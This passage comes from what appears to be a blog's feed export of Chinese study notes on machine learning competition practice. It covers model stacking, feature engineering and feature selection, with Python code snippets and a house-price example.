class="hljs-string">&#x27;alpha&#x27;</span>: <span class="hljs-number">0.005</span>&#125;<br>et = SklearnWrapper(clf=ExtraTreesRegressor, seed=<span class="hljs-number">2020</span>, params=et_params)<br>rf = SklearnWrapper(clf=RandomForestRegressor, seed=<span class="hljs-number">2020</span>, params=rf_params)<br>rd = SklearnWrapper(clf=Ridge, seed=<span class="hljs-number">2020</span>, params=rd_params)<br>ls = SklearnWrapper(clf=Lasso, seed=<span class="hljs-number">2020</span>, params=ls_params)<br><br>et_oof_train, et_oof_test = get_oof(et)<br>rf_oof_train, rf_oof_test = get_oof(rf)<br>rd_oof_train, rd_oof_test = get_oof(rd)<br>ls_oof_train, ls_oof_test = get_oof(ls)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">stack_model</span>(<span class="hljs-params">oof_1, oof_2, oof_3, oof_4, predictions_1, predictions_2, predictions_3, predictions_4, y</span>):<br>    train_stack = np.hstack([oof_1, oof_2, oof_3, oof_4])<br>    test_stack = np.hstack([predictions_1, predictions_2, predictions_3, predictions_4])<br>    <br>    oof = np.zeros((train_stack.shape[<span class="hljs-number">0</span>],))<br>    predictions = np.zeros((test_stack.shape[<span class="hljs-number">0</span>],))<br>    scores = []<br><br>    <span class="hljs-keyword">for</span> fold_, (trn_idx, val_idx) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(kf.split(train_stack, y)): <br>        trn_data, trn_y = train_stack[trn_idx], y[trn_idx]<br>        val_data, val_y = train_stack[val_idx], y[val_idx]<br>        <br>        clf = Ridge(random_state=<span class="hljs-number">2020</span>)<br>        clf.fit(trn_data, trn_y)<br><br>        oof[val_idx] = clf.predict(val_data)<br>        predictions += clf.predict(test_stack) / <span class="hljs-number">5</span><br>        <br>        score_single = sqrt(mean_squared_error(val_y, oof[val_idx]))<br>        scores.append(score_single)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;fold_+<span class="hljs-number">1</span>&#125;</span>/<span class="hljs-subst">&#123;<span class="hljs-number">5</span>&#125;</span>&#x27;</span>, score_single)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;mean: &#x27;</span>,np.mean(scores))<br>   <br>    <span class="hljs-keyword">return</span> oof, predictions<br><br>oof_stack , predictions_stack  = stack_model(et_oof_train, rf_oof_train, rd_oof_train, ls_oof_train, \<br>                                             et_oof_test, rf_oof_test, rd_oof_test, <br>    ls_oof_test, y_train)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>竞赛实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习算法竞赛实战(二)</title>
    <link href="/2021/10/14/ML-Pratice/ML-Algorithm-pratice-2/"/>
    <url>/2021/10/14/ML-Pratice/ML-Algorithm-pratice-2/</url>
    
    <content type="html"><![CDATA[<h1 id="特征工程">特征工程</h1><p>“机器学习的本质上还是特征工程，数据和特征决定了机器学习的上限，而模型和算法知识逼近这个上限而已。”特征工程主要分为数据预处理，特征变换，特征提取，特征选择这四个部分。</p><h2 id="数据预处理">数据预处理</h2><p>数据质量直接决定了模型的准确性和泛化能力的高低，同时在构造特征时也会影响其顺畅性。</p><h3 id="缺失值处理">缺失值处理</h3><ul><li><p>区分缺失值</p><p>缺失值的表现出了None，NA和NaN这些，还包括用于表示数值缺失的特殊数值。在具体业务之中有些数值没有意义也应作缺失值处理。</p></li><li><p>处理方法</p><ul><li>对于类别特征：填充众数，或者直接填充一个新类别</li><li>对于数值特征：可以填充平均数，中位数，众数等</li><li>对于有序数据：可以填充相邻值</li><li>模型预测填充：可以对含有缺失值的那一列进行建模并预测其中缺失值的结果。</li></ul></li></ul><span id="more"></span><h3 id="异常值处理">异常值处理</h3><ul><li><h4 id="寻找异常值">寻找异常值</h4><ul><li>可视化分析来寻找异常值</li><li>通过简单的统计分析来发现异常值</li></ul></li><li><p>处理异常值</p><ul><li>删除含有异常值的记录</li><li>视为缺失值</li><li>平均值(中位数修正)</li><li>不处理</li></ul></li></ul><h3 id="优化内存">优化内存</h3><ul><li><p>内存回收机制，在我们删除一些变量时，使用gc.collect()来释放内存</p></li><li><p>数值类型优化</p><p>我们可以用<strong><em>np.iinfo</em></strong>来确认每一个int型子类型的最小值和最大值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>np.iinfo(np.int8).<span class="hljs-built_in">min</span><br>np.iinfo(np.int8).<span class="hljs-built_in">max</span><br></code></pre></td></tr></table></figure><p>此外，在不影响模型泛化能力的情况下，对于类别型的变量，若其编码ID的数字较大，极不连续而且种类较少，则可以重新从0开始编码，这样也能减少变量的内存占用，而对于数值型的变量，常常由于存在浮点数使得内存占用过多，可以考虑详见最小值和最大值归一化，然后乘以100，1000等，之后取整，这样不仅可以保留同一变量之间的大小关系，还极大地减少了内存占用。</p></li></ul><h2 id="特征变换">特征变换</h2><h3 id="连续变量无量纲化">连续变量无量纲化</h3><ul><li>标准化<spanclass="math inline">\(x&#39;=\frac{x-\mu}{\sigma}\)</span></li><li>区间缩放，常见的一种是利用两个最值进行缩放。</li></ul><h3 id="连续变量数据变换">连续变量数据变换</h3><ul><li><p>log变换</p><p>进行log变换可以将倾斜数据变得接近正态分布，这是因为大多数机器学习模型不能很好地处理非正态分布的数据。</p><p>cbox-cox变换，自动寻找最佳正态分布变换函数地方法。</p></li><li><p>连续变量离散化</p><p>离散化后地特征对异常数据有很强地健壮性，更便于探索数据的相关性。</p><ul><li>无监督的离散化。分桶操作可以将连续变量离散化，同时使数据平滑，即降低噪声的影响，一般分为等频和等距两种分桶方式。<ul><li><strong>等频</strong>。区间的边界值要经过选择，使得每个区间包含数量大致相等的变量实例。</li><li><strong>等距</strong>。将实例从最小值到最大值，均分为N等份，每份的距离是相等的。</li></ul></li><li>有监督的离散化。这类方法对目标有很好的区分能力，常用的是使用树模型返回叶子节点来进行离散化。</li></ul></li></ul><h3 id="类别特征转换">类别特征转换</h3><ul><li><p>自然数编码。一列有意义的类别特征(即有顺序关系)可以用自然数进行编码，利用自然数的大小关系可以保留其顺序关系。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 调用sklearn中的函数</span><br><span class="hljs-keyword">from</span> sklearn <span class="hljs-keyword">import</span> preprocessing<br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> columns:<br>le = preprocessing.LabelEncoder()<br>le.fit(data[f])<br>    <br><br><span class="hljs-comment"># 自定义实现</span><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> columns:<br>    data[f] = data[f].fillna(-<span class="hljs-number">999</span>)<br>    data[f] = data[f].<span class="hljs-built_in">map</span>(<span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(data[f].unique(), <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, data[f].nunique()))))<br></code></pre></td></tr></table></figure></li><li><p>独热编码。当前类别特征没有意义(即没有顺序关系)时，需要使用独热编码。</p></li></ul><h2 id="特征提取">特征提取</h2><h3 id="类别相关的统计特征">类别相关的统计特征</h3><ul><li><p>目标编码</p><p>目标编码可以理解为用目标变量(标签)的统计量来对类别特征进行编码，即根据目标变量进行有监督的特征构造。目标编码可能对于基数较低的类别特征通常很有效，但对于基数较高的类别特征，可能会有过拟合的风险。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">folds = KFold(n_split=<span class="hljs-number">5</span>, shuffle=<span class="hljs-literal">True</span>,random_state=<span class="hljs-number">2020</span>)<br><span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> columns:<br>colname = col + <span class="hljs-string">&#x27;_kfold&#x27;</span><br>    <span class="hljs-keyword">for</span> fold_, (trn_idx, val_idx) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(folds.split(train, train)):<br>        tmp = train.iloc[trn.idx]<br>        order_label = tmp.groupby([col])[<span class="hljs-string">&#x27;label&#x27;</span>].mean()<br>        train[colname] = train[col].<span class="hljs-built_in">map</span>(order_label)<br>order_label = train.groupby([col])[<span class="hljs-string">&#x27;label&#x27;</span>].mean()<br>    test[colname] = test[col].<span class="hljs-built_in">map</span>(order_label)<br></code></pre></td></tr></table></figure></li><li><p>count, nunique, ratio</p></li><li><p>类别特征之间交叉组合</p><p>交叉组合能够描述更细粒度的内容。对类别特征进行交叉组合在竞赛中是一项非常重要的工作，这样可以进行很好的非线性特征拟合。</p></li></ul><h3 id="数值相关的统计特征">数值相关的统计特征</h3><ul><li>数值特征之间的交叉组合</li><li>类别特征和数值特征之间的交叉组合</li><li>按行统计相关特征</li></ul><h2 id="特征选择">特征选择</h2><h3 id="特征关联性分析">特征关联性分析</h3><p>特征关联性分析时使用统计量来为特征之间的相关性进行评分，特征按照分数进行排序，要么保留，要么从数据中删除。</p><ul><li><p>皮尔逊相关系数。这种方法不仅可以衡量变量之间的线性相关性，解决共线变量问题，还可以衡量特征与标签的相关性。<strong>共享变量</strong>是指变量之间存在高度相关关系，这会降低模型的学习可用性，可解释性以及测试集的泛化性能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 根据皮尔逊相关系数的计算提取top300的相似特征</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">feature_select_person</span>(<span class="hljs-params">train, features</span>):<br>featureSelect = features[:]<br>    <span class="hljs-comment"># 进行皮尔逊相关性计算</span><br>    corr = []<br>    <span class="hljs-keyword">for</span> feat <span class="hljs-keyword">in</span> featureSelect:<br>        corr.append(<span class="hljs-built_in">abs</span>(train[[feat, <span class="hljs-string">&#x27;target&#x27;</span>]].fillna(<span class="hljs-number">0</span>).corr().values[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]))<br>        <br>se = pd.Series(corr, index=featuresSelect).sort_values(ascending=<span class="hljs-literal">False</span>)<br>    feature_select = se[:<span class="hljs-number">300</span>].index.toilst()<br>    <span class="hljs-keyword">return</span> train[feature_select]<br></code></pre></td></tr></table></figure></li><li><p>卡方检验。它用于检验特征变量与因变量之间的相关性。<spanclass="math inline">\(\chi^2=\sum{\frac{(A-E)^2}{E}}\)</span></p></li><li><p>互信息法。互信息是一个联合分布中两个变量之间相互影响关系的度量，也可以用来评价两个变量之间的相关性。</p></li></ul><h3 id="特征重要性分析">特征重要性分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">params = &#123;<br>    <span class="hljs-string">&#x27;max_depth&#x27;</span>: <span class="hljs-number">10</span>,<br>    <span class="hljs-string">&#x27;subsample&#x27;</span>: <span class="hljs-number">1</span>,<br>    <span class="hljs-string">&#x27;verbose&#x27;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-string">&#x27;seed&#x27;</span>: <span class="hljs-number">12</span>,<br>    <span class="hljs-string">&#x27;objective&#x27;</span>: <span class="hljs-string">&#x27;binary:logistic&#x27;</span><br>&#125;<br><br>xgtrain = xgb.DMartix(x, label=y)<br>bst = xgb.train(params, xgtrain, num_boost_round=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure><ul><li><p>weight计算方式。计算特征在所有树中被选为分裂特征的次数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">importtance = bst.get_score(fmap=<span class="hljs-string">&#x27;&#x27;</span>, importance_type=<span class="hljs-string">&#x27;weight&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>gain计算方式。gain表示平均增益。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">importtance = bst.get_score(fmap=<span class="hljs-string">&#x27;&#x27;</span>, importance_type=<span class="hljs-string">&#x27;gain&#x27;</span>)<br></code></pre></td></tr></table></figure></li><li><p>cover计算方式。cover具体含义是特征对每棵树的覆盖率，即特征被分到该节点的样本的二阶导数之和。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">importtance = bst.get_score(fmap=<span class="hljs-string">&#x27;&#x27;</span>, importance_type=<span class="hljs-string">&#x27;cover&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="封装方法">封装方法</h3><p>封装方法是一个比较耗时的特征选择方法。可以将对一组特征的选择视作一个搜索问题，在这个问题中，通过准备，评估不同的组合并对这些组合进行比较，从而找出最优的特征子集。</p><ul><li><p>启发式方法</p><ul><li>前向搜索。每次增量的从剩余未选中的特征中选出一个并将其加入到特征集中。</li><li>后向搜索。从特征全集开始，每次删除其中的一个特征并评价。</li></ul></li><li><p>递归消除特征法。递归消除特征法使用一个基模型来进行多轮训练，每轮模型都会先消除若干权值系数的特征在基于新特征集进行下一轮训练。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.feature_selection <span class="hljs-keyword">import</span> RFE<br><span class="hljs-keyword">from</span> sklearn.linear_model <span class="hljs-keyword">import</span> LogisticRegression<br><span class="hljs-comment"># 递归消除特征法，返回特征选择后的数据</span><br><span class="hljs-comment"># 参数estimator为基模型</span><br><span class="hljs-comment"># 参数n_features_to_select为选择的特征个数</span><br>RFE(estimator=LogisticRegression(), n_features_to_select=<span class="hljs-number">2</span>).fit_transform(data, target)<br></code></pre></td></tr></table></figure></li></ul><h2 id="实战案例">实战案例</h2><h3 id="数据预处理-1">数据预处理</h3><p>执行下面的代码进行数据读取，删除缺失值比例大于50%的特征列，并对object型的缺失特征进行填充。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">test = pd.read_csv(<span class="hljs-string">&quot;test.csv&quot;</span>)<br>train = pd.read_csv(<span class="hljs-string">&quot;train.csv&quot;</span>)<br>ntrain = train.shape[<span class="hljs-number">0</span>]<br>ntest = test.shape[<span class="hljs-number">0</span>]<br> <br>data = pd.concat([train, test], axis=<span class="hljs-number">0</span>, sort=<span class="hljs-literal">False</span>)<br><span class="hljs-comment"># 删除缺失值比例大于50%的特征列</span><br>missing_cols = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data <span class="hljs-keyword">if</span> data[c].isna().mean()*<span class="hljs-number">100</span> &gt; <span class="hljs-number">50</span>]<br>data = data.drop(missing_cols, axis=<span class="hljs-number">1</span>)<br> <br><span class="hljs-comment"># 对object型的缺失特征进行填充</span><br>object_df = data.select_dtypes(include=[<span class="hljs-string">&#x27;object&#x27;</span>])<br>numerical_df = data.select_dtypes(exclude=[<span class="hljs-string">&#x27;object&#x27;</span>])<br> <br>object_df = object_df.fillna(<span class="hljs-string">&#x27;unknow&#x27;</span>)<br></code></pre></td></tr></table></figure><p>对数值型特征用中位数进行填充</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">missing_cols = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> numerical_df <span class="hljs-keyword">if</span> numerical_df[c].isna().<span class="hljs-built_in">sum</span>() &gt; <span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> missing_cols:<br>    numerical_df[c] = numerical_df[c].fillna(numerical_df[c].median())<br></code></pre></td></tr></table></figure><p>删除未选定的特征</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">object_df = object_df.drop([<span class="hljs-string">&#x27;Heating&#x27;</span>,<span class="hljs-string">&#x27;RoofMatl&#x27;</span>,<span class="hljs-string">&#x27;Condition2&#x27;</span>,<span class="hljs-string">&#x27;Street&#x27;</span>,<span class="hljs-string">&#x27;Utilities&#x27;</span>],axis=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="特征提取-1">特征提取</h3><ul><li><p>基础特征构造</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">numerical_df.loc[numerical_df[<span class="hljs-string">&#x27;YrSold&#x27;</span>] &lt; numerical_df[<span class="hljs-string">&#x27;YearBuilt&#x27;</span>], <span class="hljs-string">&#x27;YrSold&#x27;</span> ] = <span class="hljs-number">2009</span><br>numerical_df[<span class="hljs-string">&#x27;Age_House&#x27;</span>]= (numerical_df[<span class="hljs-string">&#x27;YrSold&#x27;</span>] - numerical_df[<span class="hljs-string">&#x27;YearBuilt&#x27;</span>])<br>numerical_df[<span class="hljs-string">&#x27;TotalBsmtBath&#x27;</span>] = numerical_df[<span class="hljs-string">&#x27;BsmtFullBath&#x27;</span>] +<br>    numerical_df[<span class="hljs-string">&#x27;BsmtHalfBath&#x27;</span>]*<span class="hljs-number">0.5</span><br>numerical_df[<span class="hljs-string">&#x27;TotalBath&#x27;</span>] = numerical_df[<span class="hljs-string">&#x27;FullBath&#x27;</span>] + numerical_df[<span class="hljs-string">&#x27;HalfBath&#x27;</span>]*<span class="hljs-number">0.5</span> <br>numerical_df[<span class="hljs-string">&#x27;TotalSA&#x27;</span>] = numerical_df[<span class="hljs-string">&#x27;TotalBsmtSF&#x27;</span>] + numerical_df[<span class="hljs-string">&#x27;1stFlrSF&#x27;</span>] +\<br>numerical_df[<span class="hljs-string">&#x27;2ndFlrSF&#x27;</span>]<br></code></pre></td></tr></table></figure></li><li><p>特征编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">bin_map  = &#123;<span class="hljs-string">&#x27;TA&#x27;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;Gd&#x27;</span>:<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;Fa&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;Ex&#x27;</span>:<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;Po&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;None&#x27;</span>:<span class="hljs-number">0</span>,<br><span class="hljs-string">&#x27;Y&#x27;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;N&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;Reg&#x27;</span>:<span class="hljs-number">3</span>,<span class="hljs-string">&#x27;IR1&#x27;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;IR2&#x27;</span>:<span class="hljs-number">1</span>, \<br><span class="hljs-string">&#x27;IR3&#x27;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;None&quot;</span> : <span class="hljs-number">0</span>,<span class="hljs-string">&quot;No&quot;</span> : <span class="hljs-number">2</span>, <span class="hljs-string">&quot;Mn&quot;</span> : <span class="hljs-number">2</span>, <br><span class="hljs-string">&quot;Av&quot;</span>: <span class="hljs-number">3</span>,<span class="hljs-string">&quot;Gd&quot;</span> : <span class="hljs-number">4</span>,<span class="hljs-string">&quot;Unf&quot;</span> : <span class="hljs-number">1</span>, <span class="hljs-string">&quot;LwQ&quot;</span>: <span class="hljs-number">2</span>, \<br><span class="hljs-string">&quot;Rec&quot;</span> : <span class="hljs-number">3</span>,<span class="hljs-string">&quot;BLQ&quot;</span> : <span class="hljs-number">4</span>, <span class="hljs-string">&quot;ALQ&quot;</span> : <span class="hljs-number">5</span>, <span class="hljs-string">&quot;GLQ&quot;</span> : <span class="hljs-number">6</span>&#125;<br>object_df[<span class="hljs-string">&#x27;ExterQual&#x27;</span>] = object_df[<span class="hljs-string">&#x27;ExterQual&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;ExterCond&#x27;</span>] = object_df[<span class="hljs-string">&#x27;ExterCond&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;BsmtCond&#x27;</span>] = object_df[<span class="hljs-string">&#x27;BsmtCond&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;BsmtQual&#x27;</span>] = object_df[<span class="hljs-string">&#x27;BsmtQual&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;HeatingQC&#x27;</span>] = object_df[<span class="hljs-string">&#x27;HeatingQC&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;KitchenQual&#x27;</span>] = object_df[<span class="hljs-string">&#x27;KitchenQual&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;FireplaceQu&#x27;</span>] = object_df[<span class="hljs-string">&#x27;FireplaceQu&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;GarageQual&#x27;</span>] = object_df[<span class="hljs-string">&#x27;GarageQual&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;GarageCond&#x27;</span>] = object_df[<span class="hljs-string">&#x27;GarageCond&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;CentralAir&#x27;</span>] = object_df[<span class="hljs-string">&#x27;CentralAir&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;LotShape&#x27;</span>] = object_df[<span class="hljs-string">&#x27;LotShape&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;BsmtExposure&#x27;</span>] = object_df[<span class="hljs-string">&#x27;BsmtExposure&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;BsmtFinType1&#x27;</span>] = object_df[<span class="hljs-string">&#x27;BsmtFinType1&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br>object_df[<span class="hljs-string">&#x27;BsmtFinType2&#x27;</span>] = object_df[<span class="hljs-string">&#x27;BsmtFinType2&#x27;</span>].<span class="hljs-built_in">map</span>(bin_map)<br> <br>PavedDrive = &#123;<span class="hljs-string">&quot;N&quot;</span> : <span class="hljs-number">0</span>, <span class="hljs-string">&quot;P&quot;</span> : <span class="hljs-number">1</span>, <span class="hljs-string">&quot;Y&quot;</span> : <span class="hljs-number">2</span>&#125;<br><br>object_df[<span class="hljs-string">&#x27;PavedDrive&#x27;</span>] = object_df[<span class="hljs-string">&#x27;PavedDrive&#x27;</span>].<span class="hljs-built_in">map</span>(PavedDrive)<br><span class="hljs-comment"># 选择剩余的object特征</span><br>rest_object_columns = object_df.select_dtypes(include = [<span class="hljs-string">&#x27;object&#x27;</span>])<br><span class="hljs-comment"># 进行one-hot编码</span><br>object_df = pd.get_dummies(object_df, columns = rest_object_columns.columns) <br> <br>data = pd.concat([object_df, numerical_df], axis=<span class="hljs-number">1</span>, sort=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="特征选择-1">特征选择</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">correlation</span>(<span class="hljs-params">data, threshold</span>):<br>    col_corr = <span class="hljs-built_in">set</span>() <br>    corr_matrix = data.corr()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(corr_matrix.columns)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">abs</span>(corr_matrix.iloc[i, j]) &gt; threshold:  <span class="hljs-comment"># 相似性分数与阈值对比</span><br>                colname = corr_matrix.columns[i]  <span class="hljs-comment"># 获取列名</span><br>                col_corr.add(colname)<br><span class="hljs-keyword">return</span> col_corr<br><br><br>all_cols = [c <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data.columns <span class="hljs-keyword">if</span> c <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;SalePrice&#x27;</span>]]<br>corr_features = correlation(data[all_cols], <span class="hljs-number">0.9</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>机器学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>竞赛实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习算法竞赛实战(一)</title>
    <link href="/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/"/>
    <url>/2021/10/10/ML-Pratice/ML-Algorithm-pratice-1/</url>
    
    <content type="html"><![CDATA[<p>本文为学习《机器学习算法竞赛实战》时所做的笔记，仅供复习总结参考，不做任何商业用途，如有侵权，请联系删除。</p><h1 id="初见竞赛">初见竞赛</h1><h2 id="竞赛平台">竞赛平台</h2><ul><li>Kaggle</li><li>天池</li><li>DataFountain</li><li>DataCastle</li><li>Kesci</li><li>JDATA</li></ul><h2 id="竞赛流程">竞赛流程</h2><p>吴恩达老师曾经说过，机器学习算法在大多数时候就只是数学统计而已，数据相关的特征工程直接决定了模型的上限，而算法只是不断逼近这个上限而已。</p><ul><li>问题建模</li><li>数据探索EDA(Exploratory Data Analysis)</li><li>特征工程</li><li>模型训练</li><li>模型融合</li></ul><span id="more"></span><h1 id="问题建模">问题建模</h1><p>当竞赛者拿到题目的时候，首先考虑的事情就是问题建模，同时完成基线(baseline)模型的管道(pipeline)搭建，从而能够第一时间获得结果上的反馈，帮助后续工作的进行。</p><h2 id="赛题理解">赛题理解</h2><h3 id="业务背景">业务背景</h3><ul><li>深入业务</li><li>明确目标</li></ul><h3 id="数据理解">数据理解</h3><ul><li><p>数据基础层</p><p>数据基础层重点关注的是每个数据字段的来源，生产过程，取数逻辑，计算逻辑等。</p></li><li><p>数据描述层</p><p>数据描述层主要是在处理好的数据基础层上进行统计分析和概括描述，这个层面的重点在于尽可能地通过一些简单统计量来概括整体状况，也使得参赛者能够清晰地知晓数据的基本情况。</p></li></ul><h2 id="评价指标">评价指标</h2><h4 id="分类指标">分类指标</h4><p>分类问题不仅是竞赛中常出现的一种核心问题，也是实际应用中常见的一种机器学习问题。</p><ul><li><p>错误率与精度</p></li><li><p>准确率与召回率</p><table><tr><th 